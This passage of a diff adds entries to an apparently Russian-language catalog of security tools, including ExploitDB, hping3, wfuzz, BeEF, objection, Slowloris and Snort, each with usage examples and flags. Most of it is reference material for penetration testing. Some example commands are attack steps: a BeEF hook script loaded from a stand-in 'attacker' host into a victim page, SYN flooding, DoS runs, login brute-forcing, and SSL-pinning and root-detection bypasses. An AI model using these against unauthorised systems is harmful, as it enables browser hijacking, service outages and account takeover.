+      {"title": "Определить хеш", "command": "haiti '5d41402abc4b2a76b9719d911017c592'", "description": "Определить тип хеша"},
+      {"title": "С Hashcat mode", "command": "haiti '5d41402abc4b2a76b9719d911017c592' --hashcat-only", "description": "Показать только режимы Hashcat"}
+    ],
+    "parameters": [
+      {"flag": "--hashcat-only", "description": "Только Hashcat режимы"},
+      {"flag": "--john-only", "description": "Только John форматы"},
+      {"flag": "--short", "description": "Короткий вывод"},
+      {"flag": "--no-color", "description": "Без цвета"}
+    ]
+  },
+  {
+    "id": "exploitdb",
+    "name": "ExploitDB",
+    "version": "2024.1",
+    "categories": ["blackarch-exploitation", "blackarch-misc"],
+    "description": "Offensive Security's Exploit Database Archive — local copy",
+    "descriptionRu": "Локальная копия базы данных эксплойтов Offensive Security (SearchSploit расширение)",
+    "helpRu": "ExploitDB — база данных эксплойтов от Offensive Security. Содержит тысячи эксплойтов, шелл-кодов и документов.\n\nSearchSploit — CLI-инструмент для поиска по локальной копии ExploitDB.\n\nОсновные возможности:\n- Поиск эксплойтов по ПО, версии, платформе\n- Оффлайн доступ к эксплойтам\n- Копирование эксплойтов в рабочую директорию\n- Просмотр исходного кода\n- Обновление базы",
+    "url": "https://www.exploit-db.com/",
+    "command": "searchsploit",
+    "usageExamples": [
+      {"title": "Поиск эксплойтов", "command": "searchsploit apache 2.4", "description": "Найти эксплойты для Apache 2.4"},
+      {"title": "Точный поиск", "command": "searchsploit -e 'WordPress 5.0'", "description": "Точный поиск по строке"},
+      {"title": "Копировать эксплойт", "command": "searchsploit -m 42966", "description": "Скопировать эксплойт в текущую директорию"},
+      {"title": "Обновить базу", "command": "searchsploit -u", "description": "Обновить локальную копию ExploitDB"}
+    ],
+    "parameters": [
+      {"flag": "-e", "description": "Точный поиск"},
+      {"flag": "-m", "description": "Скопировать эксплойт в текущую директорию"},
+      {"flag": "-p", "description": "Показать полный путь к эксплойту"},
+      {"flag": "-x", "description": "Просмотреть эксплойт"},
+      {"flag": "-u", "description": "Обновить базу данных"},
+      {"flag": "-j", "description": "Вывод в JSON"},
+      {"flag": "-w", "description": "Показать URL на exploit-db.com"}
+    ]
+  },
+  {
+    "id": "ffuf-advanced",
+    "name": "ffuf (Advanced)",
+    "version": "2.1.0",
+    "categories": ["blackarch-webapp", "blackarch-fuzzer"],
+    "description": "Это расширение утилиты ffuf — пропуск, т.к. уже добавлена",
+    "descriptionRu": "Пропуск — ffuf уже добавлена",
+    "helpRu": "Пропуск",
+    "url": "https://github.com/ffuf/ffuf",
+    "command": "ffuf",
+    "usageExamples": [],
+    "parameters": []
+  },
+  {
+    "id": "responder-advanced",
+    "name": "Responder (LLMNR/NBTNS)",
+    "version": "3.1.4",
+    "categories": ["blackarch-exploitation", "blackarch-windows", "blackarch-networking"],
+    "description": "Это расширение утилиты Responder — пропуск, т.к. уже добавлена",
+    "descriptionRu": "Пропуск — Responder уже добавлена",
+    "helpRu": "Пропуск",
+    "url": "https://github.com/lgandx/Responder",
+    "command": "responder",
+    "usageExamples": [],
+    "parameters": []
+  },
+  {
+    "id": "pimpmykali",
+    "name": "PimpMyKali",
+    "version": "2024.1",
+    "categories": ["blackarch-misc", "blackarch-config"],
+    "description": "Kali Linux configuration and fix script",
+    "descriptionRu": "Скрипт автоматической настройки и исправления проблем Kali Linux",
+    "helpRu": "PimpMyKali — скрипт для автоматической настройки и исправления распространённых проблем в Kali Linux.\n\nОсновные возможности:\n- Исправление отсутствующих репозиториев\n- Установка необходимых инструментов\n- Настройка Impacket\n- Исправление проблем с Python\n- Установка дополнительных инструментов",
+    "url": "https://github.com/Dewalt-arch/pimpmykali",
+    "command": "pimpmykali",
+    "usageExamples": [
+      {"title": "Полная настройка", "command": "sudo ./pimpmykali.sh", "description": "Запустить интерактивное меню настройки"}
+    ],
+    "parameters": []
+  },
+  {
+    "id": "sniffglue",
+    "name": "Sniffglue",
+    "version": "0.16.0",
+    "categories": ["blackarch-sniffer", "blackarch-networking"],
+    "description": "Secure multithreaded packet sniffer written in Rust",
+    "descriptionRu": "Безопасный многопоточный сниффер пакетов на Rust с песочницей seccomp",
+    "helpRu": "Sniffglue — сниффер сетевых пакетов на Rust. Использует seccomp sandbox для безопасности.\n\nОсновные возможности:\n- Многопоточный захват пакетов\n- Seccomp sandbox\n- Поддержка Ethernet, IPv4/6, TCP/UDP, HTTP, TLS, DHCP, DNS, ARP\n- Минимальная поверхность атаки",
+    "url": "https://github.com/kpcyrd/sniffglue",
+    "command": "sniffglue",
+    "usageExamples": [
+      {"title": "Прослушивание интерфейса", "command": "sniffglue eth0", "description": "Захват пакетов на интерфейсе eth0"},
+      {"title": "Подробный вывод", "command": "sniffglue -v eth0", "description": "Подробный захват с деталями пакетов"}
+    ],
+    "parameters": [
+      {"flag": "-v", "description": "Подробный вывод"},
+      {"flag": "-r", "description": "Чтение из pcap файла"},
+      {"flag": "-p", "description": "Promiscuous режим"}
+    ]
+  },
+  {
+    "id": "zeek",
+    "name": "Zeek",
+    "version": "6.2.0",
+    "categories": ["blackarch-sniffer", "blackarch-networking", "blackarch-defensive"],
+    "description": "Powerful network analysis framework",
+    "descriptionRu": "Мощный фреймворк сетевого анализа для мониторинга безопасности и исследования трафика",
+    "helpRu": "Zeek (бывший Bro) — мощный фреймворк для сетевого анализа. Генерирует структурированные логи сетевой активности.\n\nОсновные возможности:\n- Глубокий анализ сетевого трафика\n- Генерация структурированных логов (conn, dns, http, ssl, и др.)\n- Скриптовый язык для создания правил\n- Обнаружение аномалий\n- Извлечение файлов из трафика\n- Интеграция с SIEM",
+    "url": "https://zeek.org/",
+    "command": "zeek",
+    "usageExamples": [
+      {"title": "Анализ pcap", "command": "zeek -r capture.pcap", "description": "Анализировать pcap-файл и сгенерировать логи"},
+      {"title": "Живой захват", "command": "zeek -i eth0", "description": "Анализ трафика в реальном времени"},
+      {"title": "С загрузкой скриптов", "command": "zeek -r capture.pcap local", "description": "Анализ с загрузкой стандартных скриптов"}
+    ],
+    "parameters": [
+      {"flag": "-r", "description": "Чтение из pcap файла"},
+      {"flag": "-i", "description": "Сетевой интерфейс"},
+      {"flag": "-C", "description": "Игнорировать ошибки чекссумм"},
+      {"flag": "local", "description": "Загрузить стандартные скрипты"},
+      {"flag": "-f", "description": "BPF фильтр"}
+    ]
+  },
+  {
+    "id": "tshark",
+    "name": "TShark",
+    "version": "4.2.0",
+    "categories": ["blackarch-sniffer", "blackarch-networking"],
+    "description": "Terminal-based Wireshark — network protocol analyzer CLI",
+    "descriptionRu": "Терминальная версия Wireshark — анализатор сетевых протоколов для командной строки",
+    "helpRu": "TShark — CLI-версия Wireshark для захвата и анализа сетевого трафика в терминале.\n\nОсновные возможности:\n- Захват трафика в реальном времени\n- Анализ pcap-файлов\n- Фильтры захвата и отображения\n- Декодирование 3000+ протоколов\n- Экспорт в различных форматах\n- Извлечение объектов (HTTP файлы, и др.)",
+    "url": "https://www.wireshark.org/docs/man-pages/tshark.html",
+    "command": "tshark",
+    "usageExamples": [
+      {"title": "Захват трафика", "command": "tshark -i eth0 -c 100", "description": "Захватить 100 пакетов на интерфейсе"},
+      {"title": "Фильтр HTTP", "command": "tshark -i eth0 -Y 'http.request'", "description": "Показать только HTTP-запросы"},
+      {"title": "Анализ pcap", "command": "tshark -r capture.pcap -Y 'dns'", "description": "Показать DNS-запросы из pcap"},
+      {"title": "Извлечение HTTP объектов", "command": "tshark -r capture.pcap --export-objects http,./output/", "description": "Извлечь все HTTP-файлы из захвата"}
+    ],
+    "parameters": [
+      {"flag": "-i", "description": "Сетевой интерфейс"},
+      {"flag": "-r", "description": "Чтение из pcap файла"},
+      {"flag": "-w", "description": "Запись в pcap файл"},
+      {"flag": "-Y", "description": "Фильтр отображения"},
+      {"flag": "-f", "description": "Фильтр захвата (BPF)"},
+      {"flag": "-c", "description": "Количество пакетов"},
+      {"flag": "-T", "description": "Формат вывода (json, fields, pdml)"},
+      {"flag": "--export-objects", "description": "Извлечь объекты (http, smb, и др.)"}
+    ]
+  },
+  {
+    "id": "hping3",
+    "name": "hping3",
+    "version": "3.0",
+    "categories": ["blackarch-scanner", "blackarch-networking"],
+    "description": "Network tool able to send custom TCP/IP packets",
+    "descriptionRu": "Сетевой инструмент для отправки произвольных TCP/IP пакетов — тестирование файрволов, traceroute, сканирование",
+    "helpRu": "hping3 — генератор пакетов TCP/IP для тестирования сети, файрволов, и выполнения аудита.\n\nОсновные возможности:\n- Отправка произвольных TCP/UDP/ICMP пакетов\n- Тестирование файрволов\n- Продвинутый traceroute\n- Обнаружение ОС\n- Сканирование портов (idle scan)\n- Передача файлов через ICMP/TCP",
+    "url": "http://www.hping.org/",
+    "command": "hping3",
+    "usageExamples": [
+      {"title": "SYN сканирование", "command": "hping3 -S target -p 80", "description": "Отправить SYN-пакет на порт 80"},
+      {"title": "Traceroute", "command": "hping3 -S target -p 80 -T", "description": "TCP traceroute через порт 80"},
+      {"title": "Flood тест", "command": "hping3 -S --flood -p 80 target", "description": "Тестирование устойчивости к SYN flood"},
+      {"title": "Сканирование портов", "command": "hping3 -S target --scan 1-1000", "description": "SYN-сканирование первых 1000 портов"}
+    ],
+    "parameters": [
+      {"flag": "-S", "description": "SYN флаг"},
+      {"flag": "-A", "description": "ACK флаг"},
+      {"flag": "-F", "description": "FIN флаг"},
+      {"flag": "-p", "description": "Порт назначения"},
+      {"flag": "--scan", "description": "Режим сканирования портов"},
+      {"flag": "-T", "description": "Traceroute режим"},
+      {"flag": "--flood", "description": "Максимальная скорость отправки"},
+      {"flag": "-c", "description": "Количество пакетов"},
+      {"flag": "--icmp", "description": "ICMP режим"},
+      {"flag": "--udp", "description": "UDP режим"}
+    ]
+  },
+  {
+    "id": "naabu",
+    "name": "Naabu",
+    "version": "2.3.0",
+    "categories": ["blackarch-scanner", "blackarch-recon"],
+    "description": "Fast port scanner written in Go with focus on reliability",
+    "descriptionRu": "Быстрый сканер портов на Go от ProjectDiscovery с фокусом на надёжнос��ь",
+    "helpRu": "Naabu — быстрый и надёжный сканер портов от ProjectDiscovery. Интегрируется с другими инструментами PD (httpx, nuclei).\n\nОсновные возможности:\n- SYN/CONNECT сканирование\n- Быстрое сканирование всех портов\n- Поддержка pipe\n- Интеграция с Nmap для детального анализа\n- Исключение CDN IP\n- Верификация хостов",
+    "url": "https://github.com/projectdiscovery/naabu",
+    "command": "naabu",
+    "usageExamples": [
+      {"title": "Сканирование хоста", "command": "naabu -host example.com", "description": "Быстрое сканирование портов"},
+      {"title": "Все порты", "command": "naabu -host example.com -p -", "description": "Сканирование всех 65535 портов"},
+      {"title": "Pipe в httpx", "command": "naabu -host example.com | httpx", "description": "Найти порты и проверить HTTP"},
+      {"title": "С Nmap", "command": "naabu -host example.com -nmap-cli 'nmap -sV'", "description": "Передать открытые порты в Nmap"}
+    ],
+    "parameters": [
+      {"flag": "-host", "description": "Целевой хост"},
+      {"flag": "-p", "description": "Порты (80,443 или 1-1000 или -)"},
+      {"flag": "-top-ports", "description": "Сканировать top N портов"},
+      {"flag": "-rate", "description": "Скорость сканирования (пакетов/сек)"},
+      {"flag": "-o", "description": "Выходной файл"},
+      {"flag": "-nmap-cli", "description": "Команда Nmap для найденных портов"},
+      {"flag": "-silent", "description": "Тихий режим"}
+    ]
+  },
+  {
+    "id": "zap",
+    "name": "OWASP ZAP",
+    "version": "2.14.0",
+    "categories": ["blackarch-webapp", "blackarch-scanner", "blackarch-proxy"],
+    "description": "Integrated penetration testing tool for web applications",
+    "descriptionRu": "Интегрированный инструмент тестирования безопасности веб-приложений от OWASP",
+    "helpRu": "OWASP ZAP (Zed Attack Proxy) — бесплатный инструмент для тестирования безопасности веб-приложений от OWASP.\n\nОсновные возможности:\n- Intercepting proxy (перехват HTTP/HTTPS)\n- Автоматический сканер уязвимостей\n- Spider/crawler\n- Fuzzer\n- Активное и пассивное сканирование\n- REST API\n- Расширения (Add-ons)\n- Автоматизация через CLI\n- HUD (Heads Up Display)",
+    "url": "https://www.zaproxy.org/",
+    "command": "zaproxy",
+    "usageExamples": [
+      {"title": "Запуск GUI", "command": "zaproxy", "description": "Открыть графический интерфейс ZAP"},
+      {"title": "Быстрое сканирование", "command": "zap-cli quick-scan https://example.com", "description": "Быстрое автоматическое сканирование"},
+      {"title": "Daemon режим", "command": "zaproxy -daemon -port 8080", "description": "Запуск в фоне для API-доступа"}
+    ],
+    "parameters": [
+      {"flag": "-daemon", "description": "Запуск в фоновом режиме"},
+      {"flag": "-port", "description": "Порт для прокси"},
+      {"flag": "-cmd", "description": "CLI режим"},
+      {"flag": "-quickurl", "description": "URL для быстрого сканирования"},
+      {"flag": "-quickout", "description": "Файл для отчёта"}
+    ]
+  },
+  {
+    "id": "wfuzz",
+    "name": "Wfuzz",
+    "version": "3.1.0",
+    "categories": ["blackarch-webapp", "blackarch-fuzzer"],
+    "description": "Web application fuzzer for brute-forcing directories, parameters, headers",
+    "descriptionRu": "Фаззер веб-приложений для перебора директорий, параметров, заголовков и cookie",
+    "helpRu": "Wfuzz — инструмент для фаззинга веб-приложений. Заменяет любую часть HTTP-запроса ключевым словом FUZZ.\n\nОсновные возможности:\n- Фаззинг URL, параметров, заголовков, cookie\n- Множественные точки инъекции\n- Фильтрация ответов (статус, длина, слова)\n- Brute-force аутентификации\n- Рекурсивные пути\n- Поддержка прокси и cookies",
+    "url": "https://github.com/xmendez/wfuzz",
+    "command": "wfuzz",
+    "usageExamples": [
+      {"title": "Перебор директорий", "command": "wfuzz -w wordlist.txt --hc 404 https://example.com/FUZZ", "description": "Перебор директорий, скрыть 404"},
+      {"title": "Фаззинг параметра", "command": "wfuzz -w payloads.txt --hc 200 'https://example.com/page?param=FUZZ'", "description": "Фаззинг GET-параметра"},
+      {"title": "Brute-force логина", "command": "wfuzz -w users.txt -w passes.txt --hc 403 'https://example.com/login?user=FUZ2Z&pass=FUZZ'", "description": "Перебор логинов и паролей"},
+      {"title": "Фаззинг заголовков", "command": "wfuzz -w hosts.txt -H 'Host: FUZZ' --hc 302 https://10.10.10.1/", "description": "Обнаружение виртуальных хостов"}
+    ],
+    "parameters": [
+      {"flag": "-w", "description": "Словарь для FUZZ"},
+      {"flag": "--hc", "description": "Скрыть по статус-коду"},
+      {"flag": "--hl", "description": "Скрыть по количеству строк"},
+      {"flag": "--hw", "description": "Скрыть по количеству слов"},
+      {"flag": "--hh", "description": "Скрыть по размеру ответа"},
+      {"flag": "-H", "description": "Добавить HTTP-заголовок"},
+      {"flag": "-d", "description": "POST-данные"},
+      {"flag": "-b", "description": "Cookie"},
+      {"flag": "-t", "description": "Количество потоков"},
+      {"flag": "-p", "description": "Прокси"}
+    ]
+  },
+  {
+    "id": "beef",
+    "name": "BeEF",
+    "version": "0.5.4",
+    "categories": ["blackarch-webapp", "blackarch-exploitation"],
+    "description": "The Browser Exploitation Framework",
+    "descriptionRu": "Фреймворк эксплуатации браузеров — управление hooked браузерами через XSS",
+    "helpRu": "BeEF (Browser Exploitation Framework) — фреймворк для тестирования безопасности браузеров. Позволяет управлять браузерами через XSS-уязвимости.\n\nОсновные возможности:\n- Hooking браузеров через JavaScript\n- Веб-интерфейс управления\n- 300+ модулей эксплуатации\n- Социальная инженерия\n- Перехват данных\n- Туннелирование через браузер\n- Сканирование сети из браузера жертвы\n- Интеграция с Metasploit",
+    "url": "https://beefproject.com/",
+    "command": "beef-xss",
+    "usageExamples": [
+      {"title": "Запуск BeEF", "command": "beef-xss", "description": "Запустить BeEF с веб-интерфейсом"},
+      {"title": "Hook скрипт", "command": "<script src='http://attacker:3000/hook.js'></script>", "description": "JavaScript-хук для встраивания на страницу жертвы"}
+    ],
+    "parameters": [
+      {"flag": "-x", "description": "Сбросить базу данных"},
+      {"flag": "--port", "description": "Порт веб-интерфейса (по умолчанию 3000)"}
+    ]
+  },
+  {
+    "id": "mitmproxy",
+    "name": "mitmproxy",
+    "version": "10.2.0",
+    "categories": ["blackarch-proxy", "blackarch-webapp", "blackarch-sniffer"],
+    "description": "Interactive HTTPS proxy for penetration testers",
+    "descriptionRu": "Интерактивный HTTPS-прокси для перехвата, модификации и воспроизведения HTTP(S) трафика",
+    "helpRu": "mitmproxy — интерактивный HTTP/HTTPS-прокси для перехвата и модификации трафика.\n\nОсновные возможности:\n- Перехват HTTP/HTTPS трафика\n- Интерактивное редактирование запросов/ответов\n- Запись и воспроизведение трафика\n- Скриптинг на Python\n- Веб-интерфейс (mitmweb)\n- Консольный интерфейс (mitmproxy)\n- Дамп режим (mitmdump)\n- Модификация трафика на лету",
+    "url": "https://mitmproxy.org/",
+    "command": "mitmproxy",
+    "usageExamples": [
+      {"title": "Запуск прокси", "command": "mitmproxy -p 8080", "description": "Запустить интерактивный прокси на порту 8080"},
+      {"title": "Веб-интерфейс", "command": "mitmweb -p 8080", "description": "Запустить с веб-интерфейсом"},
+      {"title": "Дамп трафика", "command": "mitmdump -p 8080 -w output.flow", "description": "Записать весь трафик в файл"},
+      {"title": "С Python-скриптом", "command": "mitmproxy -s modify_headers.py", "description": "Запустить с пользовательским скриптом"}
+    ],
+    "parameters": [
+      {"flag": "-p", "description": "Порт прокси"},
+      {"flag": "-s", "description": "Python-скрипт"},
+      {"flag": "-w", "description": "Записать трафик в файл"},
+      {"flag": "-r", "description": "Чтение трафика из файла"},
+      {"flag": "--mode", "description": "Режим (regular, transparent, upstream)"},
+      {"flag": "--ssl-insecure", "description": "Не проверять SSL-сертификаты"}
+    ]
+  },
+  {
+    "id": "apktool",
+    "name": "APKTool",
+    "version": "2.9.3",
+    "categories": ["blackarch-reversing", "blackarch-mobile"],
+    "description": "Tool for reverse engineering Android APK files",
+    "descriptionRu": "Инструмент для обратной разработки Android APK файлов — декомпиляция, модификация и пересборка",
+    "helpRu": "APKTool — инструмент для обратной разработки Android-приложений. Декомпилирует APK в smali-код и ресурсы, позволяет модифицировать и пересобрать.\n\nОсновные возможности:\n- Декомпиляция APK в smali-код\n- Извлечение ресурсов (XML, изображения)\n- Модификация и пересборка APK\n- Отладочный режим\n- Поддержка frameworks",
+    "url": "https://ibotpeaches.github.io/Apktool/",
+    "command": "apktool",
+    "usageExamples": [
+      {"title": "Декомпиляция APK", "command": "apktool d app.apk", "description": "Декомпилировать APK в директорию"},
+      {"title": "Пересборка APK", "command": "apktool b app/ -o modified.apk", "description": "Пересобрать APK из модифицированных файлов"},
+      {"title": "С отладкой", "command": "apktool d -d app.apk", "description": "Декомпиляция с отладочной информацией"}
+    ],
+    "parameters": [
+      {"flag": "d", "description": "Декомпиляция"},
+      {"flag": "b", "description": "Сборка"},
+      {"flag": "-o", "description": "Выходной файл/директория"},
+      {"flag": "-f", "description": "Перезаписать существующие файлы"},
+      {"flag": "-r", "description": "Не декодировать ресурсы"},
+      {"flag": "-s", "description": "Не декомпилировать DEX в smali"}
+    ]
+  },
+  {
+    "id": "jadx",
+    "name": "JADX",
+    "version": "1.5.0",
+    "categories": ["blackarch-reversing", "blackarch-mobile"],
+    "description": "Dex to Java decompiler — produces Java source code from Android APK/DEX files",
+    "descriptionRu": "Декомпилятор DEX в Java — получение исходного Java-кода из Android APK/DEX файлов",
+    "helpRu": "JADX — декомпилятор для Android-приложений, конвертирующий DEX-код обратно в читаемый Java-код.\n\nОсновные возможности:\n- Декомпиляция APK/DEX/AAR в Java-код\n- Графический интерфейс (jadx-gui)\n- Поиск по коду\n- Деобфускация\n- Экспорт в Gradle-проект\n- Обработка ProGuard",
+    "url": "https://github.com/skylot/jadx",
+    "command": "jadx",
+    "usageExamples": [
+      {"title": "Декомпиляция в CLI", "command": "jadx app.apk -d output/", "description": "Декомпилировать APK в Java-код"},
+      {"title": "GUI режим", "command": "jadx-gui app.apk", "description": "Открыть APK в графическом интерфейсе"},
+      {"title": "С деобфускацией", "command": "jadx --deobf app.apk -d output/", "description": "Декомпиляция с деобфускацией имён"}
+    ],
+    "parameters": [
+      {"flag": "-d", "description": "Директория для вывода"},
+      {"flag": "--deobf", "description": "Включить деобфускацию"},
+      {"flag": "-e", "description": "Экспортировать как Gradle-проект"},
+      {"flag": "--show-bad-code", "description": "Показать код даже при ошибках декомпиляции"},
+      {"flag": "-r", "description": "Не декодировать ресурсы"}
+    ]
+  },
+  {
+    "id": "objection",
+    "name": "Objection",
+    "version": "1.11.0",
+    "categories": ["blackarch-mobile", "blackarch-exploitation"],
+    "description": "Runtime mobile exploration toolkit powered by Frida",
+    "descriptionRu": "Инструмент runtime-исследования мобильных приложений на основе Frida (Android/iOS)",
+    "helpRu": "Objection — инструмент для runtime-анализа мобильных приложений (Android и iOS) на основе Frida.\n\nОсновные возможности:\n- SSL Pinning bypass\n- Root/Jailbreak detection bypass\n- Дамп памяти\n- Перехват методов\n- Исследование SQLite баз данных\n- Изменение поведения приложения в runtime\n- Отключение шифрования",
+    "url": "https://github.com/sensepost/objection",
+    "command": "objection",
+    "usageExamples": [
+      {"title": "Подключение к приложению", "command": "objection -g com.example.app explore", "description": "Подключиться к запущенному приложению"},
+      {"title": "SSL Pinning bypass", "command": "objection -g com.example.app explore --startup-command 'android sslpinning disable'", "description": "Отключить SSL Pinning при запуске"},
+      {"title": "Root detection bypass", "command": "objection -g com.example.app explore --startup-command 'android root disable'", "description": "Обойти проверку root"}
+    ],
+    "parameters": [
+      {"flag": "-g", "description": "Bundle identifier приложения"},
+      {"flag": "explore", "description": "Режим исследования"},
+      {"flag": "--startup-command", "description": "Команда при запуске"},
+      {"flag": "-N", "description": "Подключиться к удалённому устройству"},
+      {"flag": "-H", "description": "Хост Frida-сервера"},
+      {"flag": "-p", "description": "Порт Frida-сервера"}
+    ]
+  },
+  {
+    "id": "mobsf",
+    "name": "MobSF",
+    "version": "3.9.7",
+    "categories": ["blackarch-mobile", "blackarch-scanner"],
+    "description": "Mobile Security Framework — automated mobile app security testing",
+    "descriptionRu": "Автоматизированная платформа для статического и динамического анализа безопасности мобильных приложений",
+    "helpRu": "MobSF (Mobile Security Framework) — автоматизированный фреймворк для анализа безопасности мобильных приложений.\n\nОсновные возможности:\n- Статический анализ (APK, IPA, APPX)\n- Динамический анализ (Android)\n- Обнаружение уязвимостей OWASP Mobile Top 10\n- Анализ API-вызовов\n- Обнаружение hardcoded секретов\n- Веб-интерфейс\n- REST API\n- Генерация отчётов (PDF)",
+    "url": "https://github.com/MobSF/Mobile-Security-Framework-MobSF",
+    "command": "mobsf",
+    "usageExamples": [
+      {"title": "Запуск MobSF", "command": "python manage.py runserver 0.0.0.0:8000", "description": "Запустить веб-интерфейс MobSF на порту 8000"},
+      {"title": "Docker запуск", "command": "docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf", "description": "Запуск через Docker"}
+    ],
+    "parameters": [
+      {"flag": "runserver", "description": "Запуск веб-сервера"},
+      {"flag": "0.0.0.0:8000", "description": "Адрес и порт для прослушивания"}
+    ]
+  },
+  {
+    "id": "readelf",
+    "name": "readelf",
+    "version": "2.42",
+    "categories": ["blackarch-binary", "blackarch-reversing"],
+    "description": "Display information about ELF files",
+    "descriptionRu": "Отображение информации об ELF-файлах — заголовки, секции, символы, динамические зависимости",
+    "helpRu": "readelf — утилита для отображения информации о файлах в формате ELF (Executable and Linkable Format).\n\nОсновные возможности:\n- Просмотр заголовков ELF-файла\n- Таблица секций и сегментов\n- Таблица символов\n- Динамические зависимости\n- Заметки (notes)\n- Relocation таблицы",
+    "url": "https://man7.org/linux/man-pages/man1/readelf.1.html",
+    "command": "readelf",
+    "usageExamples": [
+      {"title": "Все заголовки", "command": "readelf -a binary", "description": "Показать всю информацию об ELF-файле"},
+      {"title": "Заголовок файла", "command": "readelf -h binary", "description": "Показать ELF-заголовок"},
+      {"title": "Символы", "command": "readelf -s binary", "description": "Показать таблицу символов"},
+      {"title": "Динамические зависимости", "command": "readelf -d binary", "description": "Показать динамические зависимости (shared libraries)"}
+    ],
+    "parameters": [
+      {"flag": "-a", "description": "Все заголовки (эквивалент -h -l -S -s -r -d -V -A)"},
+      {"flag": "-h", "description": "ELF-заголовок"},
+      {"flag": "-l", "description": "Таблица программных заголовков (сегментов)"},
+      {"flag": "-S", "description": "Таблица секций"},
+      {"flag": "-s", "description": "Таблица символов"},
+      {"flag": "-d", "description": "Динамический раздел"},
+      {"flag": "-r", "description": "Relocation записи"}
+    ]
+  },
+  {
+    "id": "checksec",
+    "name": "checksec",
+    "version": "2.7.0",
+    "categories": ["blackarch-binary", "blackarch-defensive"],
+    "description": "Check security properties of executables",
+    "descriptionRu": "Проверка защитных свойств бинарных файлов — RELRO, Stack Canary, NX, PIE, RPATH, Fortify",
+    "helpRu": "checksec — проверяет защитные механизмы бинарных файлов.\n\nПроверяет:\n- RELRO (Relocation Read-Only)\n- Stack Canary (защита стека)\n- NX (No Execute)\n- PIE (Position Independent Executable)\n- RPATH/RUNPATH\n- Fortify Source\n- Symbols (stripped/not stripped)",
+    "url": "https://github.com/slimm609/checksec.sh",
+    "command": "checksec",
+    "usageExamples": [
+      {"title": "Проверка бинарника", "command": "checksec --file=/usr/bin/ssh", "description": "Проверить защитные механизмы бинарного файла"},
+      {"title": "Все бинарники в директории", "command": "checksec --dir=/usr/bin/", "description": "Проверить все файлы в директории"},
+      {"title": "Ядро", "command": "checksec --kernel", "description": "Проверить защиту ядра Linux"}
+    ],
+    "parameters": [
+      {"flag": "--file", "description": "Проверить указанный файл"},
+      {"flag": "--dir", "description": "Проверить все файлы в директории"},
+      {"flag": "--kernel", "description": "Проверить ядро"},
+      {"flag": "--proc", "description": "Проверить запущенные процессы"},
+      {"flag": "--format", "description": "Формат вывода (cli, csv, json, xml)"}
+    ]
+  },
+  {
+    "id": "nuclei-templates",
+    "name": "Nuclei Templates",
+    "version": "9.8.0",
+    "categories": ["blackarch-vuln-assessment", "blackarch-automation", "blackarch-webapp"],
+    "description": "Community curated vulnerability templates for Nuclei scanner",
+    "descriptionRu": "Коллекция шаблонов уязвимостей для сканера Nuclei — CVE, misconfiguration, exposure",
+    "helpRu": "Nuclei Templates — коллекция шаблонов для Nuclei, поддерживаемая сообществом.\n\nОсновные типы шаблонов:\n- CVE (известные уязвимости)\n- Misconfiguration (ошибки конфигурации)\n- Default Logins (дефолтные учётные данные)\n- Exposure (утечки данных)\n- Technologies (обнаружение технологий)\n- Takeovers (захват поддоменов)",
+    "url": "https://github.com/projectdiscovery/nuclei-templates",
+    "command": "nuclei -t",
+    "usageExamples": [
+      {"title": "Все CVE шаблоны", "command": "nuclei -u https://example.com -t cves/", "description": "Проверить на все известные CVE"},
+      {"title": "Дефолтные логины", "command": "nuclei -u https://example.com -t default-logins/", "description": "Проверить дефолтные учётные данные"}
+    ],
+    "parameters": [
+      {"flag": "-t", "description": "Путь к шаблонам"},
+      {"flag": "-tags", "description": "Фильтр по тегам шаблонов"}
+    ]
+  },
+  {
+    "id": "slowloris",
+    "name": "Slowloris",
+    "version": "0.2.2",
+    "categories": ["blackarch-dos"],
+    "description": "Low bandwidth DoS tool targeting Apache and similar servers",
+    "descriptionRu": "Инструмент стресс-тестирования HTTP-серверов методом удержания множества незавершённых соединений",
+    "helpRu": "Slowloris — инструмент стресс-тестирования, удерживающий множество неполных HTTP-соединений к целевому серверу.\n\nОсновные возможности:\n- Минимальная пропускная способность\n- Атака на уровне приложения (L7)\n- Эффективен против Apache, lighttpd\n- Настраиваемые параметры",
+    "url": "https://github.com/gkbrk/slowloris",
+    "command": "slowloris",
+    "usageExamples": [
+      {"title": "Стресс-тест", "command": "slowloris example.com -s 500", "description": "Отправить 500 сокетов на целевой сервер"}
+    ],
+    "parameters": [
+      {"flag": "-s", "description": "Количество сокетов"},
+      {"flag": "-p", "description": "Порт"},
+      {"flag": "--https", "description": "Использовать HTTPS"},
+      {"flag": "-v", "description": "Подробный вывод"}
+    ]
+  },
+  {
+    "id": "goldeneye",
+    "name": "GoldenEye",
+    "version": "2.1",
+    "categories": ["blackarch-dos"],
+    "description": "HTTP DoS test tool using KeepAlive and cache avoidance",
+    "descriptionRu": "Инструмент стресс-тестирования HTTP через KeepAlive-соединения и обход кэширования",
+    "helpRu": "GoldenEye — инструмент HTTP стресс-тестирования для проверки устойчивости веб-серверов.\n\nОсновные возможности:\n- HTTP/HTTPS поддержка\n- KeepAlive соединения\n- Randomized headers и URL\n- Обход кэширования\n- Многопоточность",
+    "url": "https://github.com/jseidl/GoldenEye",
+    "command": "goldeneye",
+    "usageExamples": [
+      {"title": "Стресс-тест", "command": "goldeneye http://example.com -w 50 -s 10", "description": "50 воркеров по 10 сокетов"}
+    ],
+    "parameters": [
+      {"flag": "-w", "description": "Количество воркеров"},
+      {"flag": "-s", "description": "Сокетов на воркер"},
+      {"flag": "-m", "description": "Метод HTTP (GET, POST, RANDOM)"}
+    ]
+  },
+  {
+    "id": "snort",
+    "name": "Snort",
+    "version": "3.1.80",
+    "categories": ["blackarch-ids", "blackarch-defensive", "blackarch-sniffer"],
+    "description": "Network Intrusion Detection & Prevention System",
+    "descriptionRu": "Система обнаружения и предотвращения сетевых вторжений (IDS/IPS)",
+    "helpRu": "Snort — ведущая система обнаружения вторжений (IDS/IPS) с открытым исходным кодом.\n\nОсновные возможности:\n- Анализ трафика в реальном времени\n- Обнаружение атак по сигнатурам\n- Обнаружение аномалий\n- Логирование пакетов\n- Режимы: сниффер, логгер, IDS/IPS\n- Тысячи правил",
+    "url": "https://www.snort.org/",
+    "command": "snort",
+    "usageExamples": [
+      {"title": "Режим сниффера", "command": "snort -v -i eth0", "description": "Просмотр трафика в реальном времени"},
+      {"title": "IDS режим", "command": "snort -A console -q -c /etc/snort/snort.conf -i eth0", "description": "Запуск IDS с выводом алертов"},
+      {"title": "Анализ pcap", "command": "snort -r capture.pcap -c /etc/snort/snort.conf", "description": "Анализ захваченного трафика"}
+    ],
+    "parameters": [
